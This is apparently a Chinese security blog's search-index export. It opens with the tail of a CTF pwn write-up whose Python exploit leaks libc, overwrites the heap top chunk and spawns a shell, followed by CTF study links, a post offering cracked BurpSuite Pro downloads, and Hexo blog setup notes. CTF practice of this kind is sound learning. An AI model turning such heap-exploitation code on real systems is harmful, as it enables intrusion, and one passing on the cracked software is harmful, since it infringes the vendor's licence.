profilecr_up_profile('1','10','a'*8,'1'*12)#leak libc baselibc_base=base_addr("0x"+binascii.b2a_hex(leak(printf_addr)),'min',0x49670) #0x49670#get libc func addrprint "libc_base:"+hex(libc_base)MAGIC_addr=libc_base+localMAGICprint "MAGIC_addr:"+hex(MAGIC_addr)environ_addr=libc_base+environprint "environ_addr:"+hex(environ_addr)head_addr=libc_base+headprint "head_addr:"+hex(head_addr)main_arena_addr=libc_base+localmain_arenaprint "main_arena_addr:"+hex(main_arena_addr)topchunk=main_arena_addr+0x30print "topchunk:"+hex(topchunk)system_addr=libc_base+systemprint "system_addr:"+hex(system_addr)__malloc_hook_addr=libc_base+__malloc_hookprint "__malloc_hook_addr:"+hex(__malloc_hook_addr)'''libc_start_main=base_addr("0x"+binascii.b2a_hex(leak(environ_addr)),'min',0xa0)print "libc_start_main:"+hex(libc_start_main)head_addr_input=base_addr('0x'+binascii.b2a_hex(leak(head_addr+1))+'00','min',0x20fe8)print "head_addr_input:"+hex(head_addr_input)'''#getshellgetshell(topchunk-0xc,0x0804B004-0x8,'a'*8+p32(MAGIC_addr))io.interactive()io.close() 效果是： Ps:寻找 MAGIC 可以用 one_gadget 这个工具，工具地址在： https://github.com/david942j/one_gadget]]></content>
      <categories>
        <category>CTF</category>
        <category>比赛writeup</category>
      </categories>
      <tags>
        <tag>湖湘杯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF学习]]></title>
    <url>%2F2017%2F12%2F14%2FCTF%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[一些CTF学习的网站 CTF 资讯 XCTF联赛 350安全客 CTFTIME CTF练习 BIN:Reverse逆向学习 Pwnable Pwnable (台湾) Modern Binary Exploitation XSSXSS 挑战 SQLSqli-lbas 综合练习 网络信息攻防学习平台 白茅学院 CTF题目 西普实验吧 合天CTF I春秋CTF挑战 IDF 实验室 OJ平台以及CTF赛事复盘 XCTF-OJ Pwnhub Jarvisoj -汪师傅OJ平台 南京邮电大学复盘 各种姿势的学习平台 吾爱破解 看雪论坛 T00ls CTF-Writeup 解题报告 350安全客 CTF Writeup -github Writeups Good good study,day day up ! 回到主页]]></content>
      <categories>
        <category>CTF</category>
        <category>常见的ctf学习网站</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BurpSuite 永久使用版（附下载）]]></title>
    <url>%2F2017%2F12%2F13%2FBurpSuite%E4%B8%8B%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[BurpSuite 破解版多个版本下载 说明：1、BurpSuite 永久使用版，并非最新的 BurpSuite 破解版。 2、此版本同样是 LarryLau 破解的，但是授权日期是到 2099-12-3 3、本文将汇总一些关于 BurpSuite 的教程等，请认真查看。 BurpSuite 介绍借用一下 52pojie 的文章中的描述信息：https://www.52pojie.cn/thread-648337-1-1.html Burp Suite 是用于攻击web应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。 所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代{过}{滤}理，日志，警报的一个强大的可扩展的框架。 #burpSuite破解版下载 BurpSuiteV1.5.20 破解版，授权日期到 2099-12-3 burpsuite_pro_v1.5.20 BurpSuiteV1.6 破解版，授权日期到 2099-12-3 Burpsuite+Pro+1.6 BurpSuite 无限制版，安全性自测。 BurpUnlimited 感谢作者：Larry_Lau 若使用 BurpSuite 的时候，依然提示授权过期或者是 BurpSuite 停止响应的情况，请做如下操作： 执行 Clean burp from computer，这样会清理 burp 的授权及临时文件等，还你一个干净的 burp 使用环境，然后重新执行 burploader.jar。 执行如下操作，将对你的眼睛很有好处，同样还会解决中文乱码的问题，请看图： BurpSuite 教程BurpSuite 实战指南 BurpSuite 系列使用视频教程 在BurpSuite 中集成 Sqlmap BurpSuite 中的安全测试插件推荐 利用 BurpSuite 突破 JS 限制登陆后台 BurpSuite 实战指南请认真看完，强烈推荐。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Burpsuite</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建hexo]]></title>
    <url>%2F2017%2F12%2F12%2F%E6%90%AD%E5%BB%BAhexo%2F</url>
    <content type="text"><![CDATA[使用 Hexo+Github 一步步搭建属于自己的博客 前言：电脑系统为 window 10 专业版，64位 相关步骤：安装 Node.js 和配置好 Node.js 环境打开 cmd 命令行，成功界面如下。 安装 Git 和配置好 Git 环境安装成功的象征就是在电脑上任何位置鼠标右键能够出现如下两个选择。 注意：一般出于安全考虑，只有在 Git Bash Here 中才能进行 Git 的相关操作.如果需要在 cmd 命令行里调用 Git，那么就要配置电脑的环境变量 Path，或者在安装的时候选择 use Git from the Windows Command Prompt。这个可有可无，影响不大，成功配置的界面如图： Github账户注册和新建项目注意：项目必须要遵守格式：账户名.github.io，不然接下来会有很多麻烦.并且需要勾选 Initialize this repository with a README 在建好的项目右侧有个 settings 按钮，点击它，向下拉到 GitHub Pages你会看到那边有个网址，访问它，你将会惊奇的发现该项目已经被部署到网络上，能够通过外网来访问它。 安装 Hexo建立一个 blog 文件夹，然后通过命令行进入到该文件夹里面输入 npm install hexo -g，开始安装 Hexo。 输入 hexo -v，检查 hexo 是否安装成功 输入 hexo init，初始化该文件夹(有点漫长的等待…) 输入 npm install，安装所需要的组件 输入 hexo g，首次体验 Hexo。 输入 hexo s，开启服务器，访问该网址，正式体验He xo 注意：假如页面一直无法跳转，那么可能端口被占用了。此时我们 ctrl+c 停止服务器，接着输入”hexo server -p 端口号”来改变端口号 出现如下图就成功了 将 Hexo与Github page 联系起来设置Git的 username 和 email (如果是第一次的话) 注意：这里要替换成自己的用户名，邮箱要替换成自己的邮箱 输入 cd ~/.ssh，检查是否由 .ssh 的文件夹 输入 ls，列出该文件下的内容.下图说明 .ssh 文件夹存在 配置自己的信息输入 ssh-keygen -t rsa -C “你自己的邮箱”，连续三个回车，生成密钥.最后得到了两个文件：id_rsa 和 id_rsa.pub (默认存储路径是：.ssh 文件夹下) 输入 eval”$(ssh-agent -s)”，添加密钥到 ssh-agent 再输入 ssh-add ~/.ssh/id_rsa，添加生成的 SSH key到 ssh-agent 登录 Github，点击头像下的 settings，添加 ssh 新建一个 new ssh key，将 id_rsa.pub 文件里的内容复制上去 输入 ssh -T git@github.com，测试添加 ssh 是否成功如果看到 Hi 后面是你的用户名，就说明成功了。 配置 Deployment在其文件夹中，找到_config.yml 文件，修改 repo 值(在末尾) repository 值是你在 github 项目里的 ssh (右下角) 新建一篇博客在cmd执行命令：hexo new post “博客名” 这时候在文件夹_posts目录下将会看到已经创建的文件 使用编辑器编好文章使用命令：hexo d -g，生成以及部署了 部署成功后访问你的地址http://用户名.github.io. 那么将看到生成的文章 成功。 购买域名只推荐上 GoDaddy 购买，安全，而且可以使用支付宝。 现在 GoDaddy 已经有中文版了，虽然国家显示是新加坡，但不影响使用。 查你想要的域名 查到适合的域名之后选择「添加到购物车」 GoDaddy 其他域名收费服务，不要管，继续「进入购物车」 后面的服务全部点击「不，谢谢」，免费的服务也不要用 确认购买修改购买年限，默认是两年，可以修改成 1/2/3/5/10 年，随自己喜欢现在 GoDaddy 上 .com 每年的默认费用是7元/年但实际上，你看到我现在购买的是第1年：​¥5.86/年第 2 年后：¥101.00/年，GoDaddy 的域名价格时常有波动，以当时为准即可。 将独立域名与 GitHub Pages 的空间绑定DNS设置用DNSpod，快，免费，稳定。 注册 DNSpod，添加域名，如下图设置 其中 A 的两条记录指向的ip地址是 GitHub Pages 的提供的 ip 192.30.252.153 192.30.252.154 如博客不能登录，有可能是 GitHub 更改了空间服务的 ip 地址，记得及时到在 GitHub Pages 查看最新的 ip 即可 www 指定的记录是你在 GitHub 注册的仓库。 去 GoDaddy 修改 DNS 地址 更改 GoDaddy 的 Nameservers 为 DNSpod 的 NameServers点击你的账户，管理我的域名 点击域名 将 GoDaddy 的 Nameservers 更改成 f1g1ns1.dnspod.net 和 f1g1ns2.dnspod.net 到此为止，最基本的也是最全面的 hexo+github 搭建博客完结。]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo的使用介绍]]></title>
    <url>%2F2017%2F12%2F12%2Fhexo%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[自用笔记：本文属于自用笔记，不做详解，仅供参考。在此记录自己已理解并开始遵循的前端代码规范。What How Why 最近，使用Hexo遇到了很多问题，在设立进行整理。 写文章1234567891011121314151617181920212223$ hexo n #写文章 其中my new post为文章标题，执行命令后。 会在项目\source_posts中生成my new post.md文件，用编辑器打开编写即可。 当然，也可以直接在\source_posts中新建一个md文件，我就是这么做的。 文章开头语法：title: name #文章标题date: 2015-12-25 18:29:00 #写作时间description: #文章描述categories: #文章分类- 建站tags: #文章标签- 博客- 建站- Hexotoc: true # 生成目录author:comments:original:permalink: #指定链接--- 以上是摘要&lt;!--more--&gt; 以下是余下全文 写多钟文章12345678910111213141516171819202122$ hexo new [layout] "postName" #新建文章 [layout]：其中layout是可选参数，默认值为post。 有哪些layout呢，请到 scaffolds 目录下查看，这些文件名称就是layout名称。 当然你可以添加自己的layout，方法就是添加一个文件即可。 同时你也可以编辑现有的layout，比如post的layout默认是 hexo\scaffolds\post.md 关于hexo\scaffolds\photo.md配置文件的介绍：layout: &#123; &#123; layout &#125; &#125; #layout名称title: &#123; &#123; title &#125; &#125; #文章标题date: &#123; &#123; date &#125; &#125; #文章生成时间ategories: #文章分类目录tags: #文章标签- #photos: #- #---layout: phototitle: 我的阅历date: 2085-01-16 07:33:44tags: [hexo]photos:- http://bruce.u.qiniudn.com/2013/11/27/reading/photos-0.jpg- http://bruce.u.qiniudn.com/2013/11/27/reading/photos-1.jpg 自定义页面12345678 执行new page命令$ hexo new page "about"在 *hexo\source\* 下会生成 *about* 目录，里面有个index.md，直接编辑就可以了，然后在主题的 *_config.yml* 中将其配置显示出来。 上述步骤，也可以手工生成，在 *hexo\source\* 下手工新建 *about* 和 *index.md* 也是完全等价的。因为markdown对table的支持不好，我是在about中直接建立index.html，里面书写页面内容，hexo会帮你加上头和尾。 写页面（404）1234$ hexo new page "404"UUhike@UUhike-pc MINGW64 /d/Hexo/Hexo (master)$ hexo new page "404"INFO Created: D:\Hexo\Hexo\source\404\index-1.md 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465title: 404 Not Found：该页无法显示comments: falsepermalink: /404fancybox: false---&lt;style type="text/css"&gt; .article-title &#123; font-size: 2.1em; &#125; strong a &#123; color: #747474; &#125; .share &#123; display: none; &#125; .player &#123; margin-left: -10px; &#125; .sign &#123; text-align: right; font-style: italic; &#125; #page-visit &#123; display: none; &#125; .center &#123; text-align: center; height: 2.5em; font-weight: bold; &#125; .search2 &#123; height: 2.2em; font-size: 1em; width: 50%; margin: auto 24%; color: #727272; opacity: .6; border: 2px solid lightgray; &#125; .search2:hover &#123; opacity: 1; box-shadow: 0 0 10px rgba(0, 0, 0, 0.3) &#125;; .article-entry hr &#123; margin: 0; &#125; .pic &#123; text-align: center; margin: 0; &#125; .pic br &#123; display: none; &#125;&lt;/style&gt;***&lt;div class="pic"&gt;&lt;img src="/resources/Mihawk-Wind.gif" title="Mihawk-Wind"&gt;&lt;/div&gt;&lt;p class="center"&gt;很抱歉，您所访问的地址并不存在: &lt;/p&gt;&lt;p class="center"&gt;&lt;a href="/"&gt;回主页&lt;/a&gt; · &lt;a href="/archives"&gt;所有文章&lt;/a&gt; · &lt;a href="/about"&gt;留言板&lt;/a&gt;&lt;/p&gt;&lt;p class="center"&gt;可在边栏搜索框中对本站进行检索，以获取相关信息。&lt;/p&gt;&lt;div style="text-align: center"&gt;以下是博主喜欢的一些歌曲，可以听听，稍作休息~&lt;iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=320 height=330 src="http://music.163.com/outchain/player?type=0&amp;id=112513213&amp;auto=0&amp;height=430"&gt;&lt;/iframe&gt;&lt;/div&gt; 发布博客内容实现发布，前提是配置好，部署到Github前需要配置_config.yml文件。 123456# Deployment## Docs: http://hexo.io/docs/deployment.htmldeploy: type: github repository: git@github.com:zhchnchn/zhchnchn.github.io.git branch: master 更新的最新版本，可能会有Bug，自行百度，好像要修改type：git。 1234567$ hexo server #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）Hexo 会监视文件变动并自动更新，您无须重启服务器。$ hexo g #生成$ hexo generate #生成静态页面至public目录（最终上传这个文件到GitHub）$ hexo d == hexo deploy#部署$ hexo d #部署 # 可与hexo g合并为 hexo d -g$ hexo deploy -g$ hexo server -g # 生成默认文件群再执行,开启本地静态html服务器 文章图片路径Hexo如何方式图片，图片应该放置到哪里，不会应为上传而覆盖掉。然后把文章里的index.md删除，将文件存放在resource文件夹中间。 12345 发布页面$ hexo new page "name" # 新建一个页面，页面名称name UUhike@UUhike-pc MINGW64 /d/Hexo/Hexo (master)$ hexo new page "resoures" INFO Created: D:\Hexo\Hexo\source\resoures\index.md Hexo文件备份12345678910111213141516171819202122232425262728293031323334353637383940414243 git-backup. Install if your hexo version is 2.x.x, you should install as follow:$ npm install hexo-git-backup@0.0.91 --save if version is 3.x.x, you should install as follow:$ npm install hexo-git-backup --save Update if you install with --save, you must remove firstly when you update it.$ npm remove hexo-git-backup$ npm install hexo-git-backup --save Configure You should configure this plugin in _config.yml.backup: type: git repository: github: git@github.com:xxx/xxx.git,branchName gitcafe: git@github.com:xxx/xxx.git,branchNameUsinghexo backup orhexo bOptionsif you want to back up with your theme,just add theme: your theme name,your theme name in _config.yml.backup: type: git theme: coney,landscape,xxx repository: github: git@github.com:xxx/xxx.git,branchName gitcafe: git@github.com:xxx/xxx.git,branchNameAttention: if you do as above, the dir themes/coney/.gitwill be removedif you want DIY commit message, just add 'message: update xxx'.backup: type: git message: update xxx repository: github: git@github.com:xxx/xxx.git,branchName gitcafe: git@github.com:xxx/xxx.git,branchNameNow you can backup all the blog!ProblemsYou may get some troubles by your computer' permission。Error: EISDIR, openit is caused by permission. just do 'sudo hexo b'sudo hexo b 本地浏览hexo shexo s –draf 浏览全部文章同时可以浏览不同目录中的文件 参考资料： hexo你的博客如何搭建一个独立博客——简明Github Pages与Hexo教程]]></content>
      <categories>
        <category>软件安装与使用</category>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
